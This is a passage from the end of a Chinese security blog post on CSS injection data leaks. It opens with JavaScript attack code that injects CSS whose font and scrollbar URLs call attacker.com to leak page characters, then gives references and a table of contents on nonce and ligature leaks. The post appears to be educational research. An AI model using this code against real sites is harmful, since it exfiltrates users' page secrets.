        <span class="token comment">// å½“è¿™ä¸ªå‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®å®šå­—ä½“éƒ½åœ¨ç¼“å­˜ä¸­ã€‚</span>
        <span class="token comment">// æ‰€ä»¥è®©æˆ‘ä»¬å°è¯•ç”¨è¿™æ ·çš„é£æ ¼æ¥æ”»å‡»ï¼Œå› ä¸ºå¦‚æœä½ ç‚¹å‡»è¿™äº›å­—ç¬¦ï¼Œå°±ä¼šåœ¨ token ä¸­å‡ºç°ä¸€ä¸ªæ»šåŠ¨æ¡</span>
        <span class="token keyword">function</span> <span class="token function">createAttackIframe</span><span class="token punctuation">(</span><span class="token parameter">chars</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                <span class="token comment">// æˆ‘ä»¬å¯¹æ‰€æœ‰å€¼è¿›è¡Œç¼–ç ï¼Œä»¥ä¾¿èƒ½å¤Ÿå°†å®ƒä»¬å®‰å…¨åœ°æ”¾ç½®åœ¨ URL ä¸­ã€‚</span>
                <span class="token keyword">let</span> encodedPrefix<span class="token punctuation">;</span>
                <span class="token punctuation">[</span>encodedPrefix<span class="token punctuation">,</span> chars<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>prefix<span class="token punctuation">,</span> chars<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">val</span> <span class="token operator">=&gt;</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            
                <span class="token keyword">const</span> css <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
                @font-face {
                    font-family: "hack";
                    src: url(http://attacker.com/font/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>encodedPrefix<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>chars<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">)
                }
                script {
                    display: table;
                    font-family: "hack";
                    white-space: nowrap;
                }
                body::-webkit-scrollbar {
                    background: blue;
                }
                body::-webkit-scrollbar:horizontal {
                    background: blue url(http://attacker.com/reverse/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>chars<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">);
                }
                </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
            
                <span class="token keyword">const</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                iframe<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'http://localhost:12345/?css='</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>css<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// è¯¥ iframe å¿…é¡»ç›¸å¯¹è¾ƒçª„ - æ»šåŠ¨æ¡æ‰ä¼šå‡ºç°ã€‚</span>
                iframe<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token string">"40px"</span><span class="token punctuation">;</span>
                document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>   
        <span class="token punctuation">}</span>
        
        <span class="token comment">// æ¯ 20 æ¯«ç§’æ£€æŸ¥ä¸€æ¬¡ï¼Œçœ‹çœ‹æ˜¯å¦ç”Ÿæˆäº†é€šè¿‡æ»šåŠ¨æ¡äº§ç”Ÿäº†è¿”å›è¯·æ±‚ã€‚å¦‚æœæ˜¯è¿™æ ·ï¼Œæˆ‘ä»¬å°±ä»å­—ç¬¦ cookie è¿”å›å€¼ã€‚</span>
        <span class="token keyword">function</span> <span class="token function">getCharsFromReverseConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                <span class="token keyword">const</span> interval <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                    <span class="token keyword">const</span> chars <span class="token operator">=</span> Cookies<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'chars'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>chars<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token function">clearInterval</span><span class="token punctuation">(</span>interval<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token function">resolve</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        
        <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">delay</span><span class="token punctuation">(</span><span class="token parameter">time</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> time<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></code></pre>
<h2 id="10-å‚è€ƒæ¥æº"><a href="#10-å‚è€ƒæ¥æº" class="headerlink" title="10. å‚è€ƒæ¥æº"></a>10. å‚è€ƒæ¥æº</h2><p>[1] <a href="https://xsleaks.dev/docs/attacks/css-injection/">CSS Injection</a><br>[2] <a href="https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d">Exfiltration via CSS Injection.</a> by d0nut<br>[3] <a href="https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b">Better Exfiltration via HTML Injection</a> by d0nut<br>[4] <a href="https://x-c3ll.github.io/posts/CSS-Injection-Primitives">CSS Injection Primitives</a> by TheXC3LL<br>[5] <a href="https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail">Code Vulnerabilities Put <span class="hexo-wm">ğ˜´ï»¿â‘¶â…´ğ˜¦nÂ·â€‹â€‹ğ’”â…ˆâ€â€Œğ˜µğ˜¦â€Œ</span>Proton Mails at Risk</a> by Paul Gerstex<br>[6] <a href="https://www.youtube.com/watch?v=pnbZMvCPqSc">Stealing With Style: Using CSS to Exploit ProtonMail &amp; Friends - Black Hat Asia 2023</a> by Paul Gerste<br>[7] <a href="https://css-tricks.com/child-and-sibling-selectors/">child-and-sibling-selectors</a><br>[8] <a href="https://github.com/d0nutptr/sic">Sequential Import Chaining - GitHub</a><br>[9] <a href="https://blog.huli.tw/2022/09/29/css-injection-1/">ç”¨ CSS ä¾†å·è³‡æ–™ - CSS injectionï¼ˆä¸Šï¼‰</a> by Huli<br>[10] <a href="https://caniuse.com/css-has">:has() CSS relational pseudo-class</a><br>[11] <a href="https://blog.huli.tw/2022/09/29/css-injection-2/">ç”¨ CSS ä¾†å·è³‡æ–™ - CSS injectionï¼ˆä¸‹ï¼‰</a> by Huli<br>[12] <a href="https://blog.huli.tw/2023/12/11/0ctf-2023-writeup/">0CTF 2023 ç­†è¨˜</a> by Huli<br>[13] <a href="https://github.com/salvatore-abello/CTF-Writeups/blob/main/0ctf%20-%202023/newdiary/README.md">salvatore-abello/CTF-Writeups/0ctf - 2023/newdiary - GitHub</a><br>[14] <a href="https://research.securitum.com/stealing-data-in-great-style-how-to-use-css-to-attack-web-application/">Stealing Data in Great style â€“ How to Use CSS to Attack Web Application.</a> by MICHAÅ BENTKOWSKI </p>
</body></html>
        </div>
        
          <div class="prev-or-next">
            <div class="post-foot-next">
              
                <a href="../../write-up/2023-tuctf-writeup/" target="_self">
                  <i class="iconfont icon-chevronleft"></i>
                  <span>ä¸Šä¸€é¡µ</span>
                </a>
              
            </div>
            <div class="post-foot-prev">
              
                <a href="../../write-up/2023-%E5%BC%BA%E7%BD%91%E6%9D%AFs7-writeup/" target="_self">
                  <span>ä¸‹ä¸€é¡µ</span>
                  <i class="iconfont icon-chevronright"></i>
                </a>
              
            </div>
          </div>
        
      </div>
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="catalog-zoom">
      <div class="title">ç›®å½•</div>
      <div class="catalog-content">
        
          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95"><span class="toc-text">1. åŸºç¡€ç”¨æ³•</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%87%8F%E5%B0%91%E8%A7%84%E5%88%99%E6%95%B0%E9%87%8F"><span class="toc-text">2. å‡å°‘è§„åˆ™æ•°é‡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%8A%A0%E9%80%9F%E6%B3%84%E9%9C%B2"><span class="toc-text">3. åŠ é€Ÿæ³„éœ²</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-meta-%E6%A0%87%E7%AD%BE-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">4. meta æ ‡ç­¾ ä¿¡æ¯æ³„éœ²</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E7%BB%95%E8%BF%87-type-hidden-%E5%B1%9E%E6%80%A7%E9%99%90%E5%88%B6"><span class="toc-text">5. ç»•è¿‡ type&#x3D;hidden å±æ€§é™åˆ¶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-CSS-%E7%9B%B8%E9%82%BB%E5%90%8C%E7%BA%A7%E7%BB%84%E5%90%88%E5%99%A8%EF%BC%88-%EF%BC%89"><span class="toc-text">5.1 CSS ç›¸é‚»åŒçº§ç»„åˆå™¨ï¼ˆ+ï¼‰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-CSS-%E9%80%9A%E7%94%A8%E5%90%8C%E7%BA%A7%E7%BB%84%E5%90%88%E5%99%A8%EF%BC%88-%EF%BC%89"><span class="toc-text">5.2 CSS é€šç”¨åŒçº§ç»„åˆå™¨ï¼ˆ~ï¼‰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-CSS-has-%E9%80%89%E6%8B%A9%E5%99%A8"><span class="toc-text">5.3 CSS :has é€‰æ‹©å™¨</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E5%AE%9E%E6%97%B6%E6%9B%B4%E6%96%B0-Style-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">6. å®æ—¶æ›´æ–° Style ä¿¡æ¯æ³„éœ²</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-%E6%AD%A5%E9%AA%A4"><span class="toc-text">6.1 æ­¥éª¤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-Payload"><span class="toc-text">6.2 Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-import-%E9%80%92%E5%BD%92%E5%AF%BC%E5%85%A5"><span class="toc-text">7. @import é€’å½’å¯¼å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-import-%E7%94%A8%E6%B3%95"><span class="toc-text">7.1 @import ç”¨æ³•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-%E9%80%92%E5%BD%92%E5%AF%BC%E5%85%A5%E7%9A%84%E5%85%88%E5%86%B3%E6%9D%A1%E4%BB%B6"><span class="toc-text">7.2 é€’å½’å¯¼å…¥çš„å…ˆå†³æ¡ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-3-%E9%80%92%E5%BD%92%E5%AF%BC%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-text">7.3 é€’å½’å¯¼å…¥åŸç†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-4-%E9%80%92%E5%BD%92%E5%AF%BC%E5%85%A5%E7%A4%BA%E4%BE%8B"><span class="toc-text">7.4 é€’å½’å¯¼å…¥ç¤ºä¾‹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#7-4-1-%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7%E7%A4%BA%E4%BE%8B"><span class="toc-text">7.4.1 æœ‰æ•ˆè½½è·ç¤ºä¾‹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-4-2-%E6%AD%A5%E9%AA%A4%E7%A4%BA%E4%BE%8B"><span class="toc-text">7.4.2 æ­¥éª¤ç¤ºä¾‹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-4-3-%E9%95%BF%E8%BD%AE%E8%AF%A2%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%EF%BC%88%E7%AC%AC0%E4%BD%8D%EF%BC%89%E7%A4%BA%E4%BE%8B"><span class="toc-text">7.4.3 é•¿è½®è¯¢æœ‰æ•ˆè´Ÿè½½ï¼ˆç¬¬0ä½ï¼‰ç¤ºä¾‹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-4-4-%E9%95%BF%E8%BD%AE%E8%AF%A2%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%EF%BC%88%E7%AC%AC-1-s-%E4%BD%8D%EF%BC%89%E7%A4%BA%E4%BE%8B"><span class="toc-text">7.4.4 é•¿è½®è¯¢æœ‰æ•ˆè´Ÿè½½ï¼ˆç¬¬ 1-s ä½ï¼‰ç¤ºä¾‹</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-5-%E9%80%92%E5%BD%92%E5%AF%BC%E5%85%A5%E5%B7%A5%E5%85%B7"><span class="toc-text">7.5 é€’å½’å¯¼å…¥å·¥å…·</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-6-%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">7.6 æ³¨æ„äº‹é¡¹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#7-6-1-%E8%AF%B7%E6%B1%82%E6%95%B0%E9%87%8F%E9%99%90%E5%88%B6%E9%97%AE%E9%A2%98"><span class="toc-text">7.6.1 è¯·æ±‚æ•°é‡é™åˆ¶é—®é¢˜</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-6-2-Firefox-%E7%89%B9%E6%AE%8A%E5%A4%84%E7%90%86"><span class="toc-text">7.6.2 Firefox ç‰¹æ®Šå¤„ç†</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E5%B9%B6%E8%A1%8C%E6%B3%84%E9%9C%B2%E7%BB%84%E5%90%88"><span class="toc-text">8. å¹¶è¡Œæ³„éœ²ç»„åˆ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-1-nonce-%E5%88%87%E5%89%B2"><span class="toc-text">8.1 nonce åˆ‡å‰²</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-2-%E8%A7%A3%E5%86%B3%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98"><span class="toc-text">8.2 è§£å†³å±æ€§è¦†ç›–é—®é¢˜</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#8-2-1-%E5%88%A9%E7%94%A8-cross-fade-%E5%87%BD%E6%95%B0"><span class="toc-text">8.2.1 åˆ©ç”¨ cross-fade() å‡½æ•°</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-2-2-%E4%BD%BF%E7%94%A8-var-%E5%8F%98%E9%87%8F%E6%B3%95"><span class="toc-text">8.2.2 ä½¿ç”¨ var å˜é‡æ³•</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-nonce-%E5%A4%8D%E5%8E%9F"><span class="toc-text">8.3 nonce å¤åŸ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-1-%E5%A4%8D%E5%8E%9F%E5%8E%9F%E7%90%86"><span class="toc-text">8.3.1 å¤åŸåŸç†</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-2-JavaScript-%E5%AE%9E%E7%8E%B0"><span class="toc-text">8.3.2 JavaScript å®ç°</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-3-Python-%E5%AE%9E%E7%8E%B0"><span class="toc-text">8.3.3 Python å®ç°</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-%E9%A1%B5%E9%9D%A2%E5%86%85%E5%AE%B9%E6%B3%84%E9%9C%B2"><span class="toc-text">9. é¡µé¢å†…å®¹æ³„éœ²</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#9-1-unicode-range"><span class="toc-text">9.1 unicode-range</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-2-%E5%AD%97%E4%BD%93%E9%AB%98%E5%BA%A6%E5%B7%AE%E5%BC%82-first-line-scrollbar"><span class="toc-text">9.2 å­—ä½“é«˜åº¦å·®å¼‚ + first-line + scrollbar</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#9-2-1-%E5%AD%97%E5%85%83%E9%A1%BA%E5%BA%8F%E9%97%AE%E9%A2%98"><span class="toc-text">9.2.1 å­—å…ƒé¡ºåºé—®é¢˜</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-2-2-%E6%AD%A5%E9%AA%A4"><span class="toc-text">9.2.2 æ­¥éª¤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-2-3-%E5%B1%80%E9%99%90%E6%80%A7"><span class="toc-text">9.2.3 å±€é™æ€§</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-3-%E8%BF%9E%E5%AD%97-scrollbar"><span class="toc-text">9.3 è¿å­— + scrollbar</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#9-3-1-%E8%BF%9E%E5%AD%97"><span class="toc-text">9.3.1 è¿å­—</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-3-2-%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95"><span class="toc-text">9.3.2 å®ç°æ–¹æ³•</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-3-3-%E6%AD%A5%E9%AA%A4"><span class="toc-text">9.3.3 æ­¥éª¤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-3-4-%E6%B3%84%E9%9C%B2-JavaScript-%E4%BB%A3%E7%A0%81"><span class="toc-text">9.3.4 æ³„éœ² JavaScript ä»£ç </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-3-5-%E5%AD%97%E4%BD%93%E7%9A%84%E4%BA%A7%E7%94%9F"><span class="toc-text">9.3.5 å­—ä½“çš„äº§ç”Ÿ</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-%E5%8F%82%E8%80%83%E6%9D%A5%E6%BA%90"><span class="toc-text">10. å‚è€ƒæ¥æº</span></a></li></ol>
        
      </div>
    </div>
  </div>

  
<script src="../../js/catalog.js"></script>




    
  </div>
  <script>
    (() => {
      function compensate() {
        const bodyBox = document.querySelector('.zoom-wrap');
        if (bodyBox) {
          const gapY = bodyBox.offsetHeight - bodyBox.getBoundingClientRect().height;
          bodyBox.style.marginBottom = `-${gapY}px`;
        }

        const catBox = document.querySelector('.catalog-zoom');
        if (catBox) {
          const rect = catBox.getBoundingClientRect();
          const gapX = catBox.offsetWidth  - rect.width;
          const gapY = catBox.offsetHeight - rect.height;

          const list = catBox.querySelector('.catalog-content');
          if (list) {
            const orig = list.dataset.origHeight
                      ? parseFloat(list.dataset.origHeight)
                      : parseFloat(getComputedStyle(list).height);
            list.dataset.origHeight = orig;
            list.style.height       = (orig + gapY) + 'px';
          }

          catBox.style.marginRight  = `-${gapX}px`;
          catBox.style.marginBottom = `-${gapY}px`;
        }
      }

      function hookImages(root = document) {
        root.querySelectorAll('img').forEach(img => {
          if (img.dataset._scaledFix) return;
          img.dataset._scaledFix = 1;
          img.addEventListener('load', compensate, {once: true});
        });
      }

      addEventListener('DOMContentLoaded', () => {
        compensate();
        hookImages();
      });

      addEventListener('resize', compensate);

      const observer = new MutationObserver(muts => {
        muts.forEach(m => {
          m.addedNodes.forEach(n => {
            if (n.nodeType !== 1) return;
            if (n.tagName === 'IMG') hookImages(n.parentNode);
            else hookImages(n);
          });
        });
      });

      const wrap = document.querySelector('.zoom-wrap');
      if (wrap) observer.observe(wrap, {childList: true, subtree: true});
    })();
  </script>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          
              <a title="github" href="https://github.com/security-s3ven">
                <i class="iconfont icon-github"></i>
              </a>
              
        </li>
        
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a href="https://github.com/security-s3ven">Copyright Â© 2023-2026 s3ven</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="../../js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="æœç´¢...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>é¦–æ¬¡æœç´¢ï¼Œæ­£åœ¨è½½å…¥ç´¢å¼•æ–‡ä»¶ï¼Œè¯·ç¨åâ€¦â€¦<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>æ²¡æœ‰æ‰¾åˆ°å†…å®¹ï¼Œè¯·å°è¯•æ›´æ¢æ£€ç´¢è¯ã€‚<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>æœªæ‰¾åˆ°search.xmlæ–‡ä»¶ï¼Œå…·ä½“è¯·å‚è€ƒï¼š<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>è¯·æ±‚å¤±è´¥ï¼Œå°è¯•é‡æ–°åˆ·æ–°é¡µé¢æˆ–ç¨åé‡è¯•ã€‚<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="../../js/colorscheme.js"></script>





        

      </div>
    </div>
  </body>
</html>
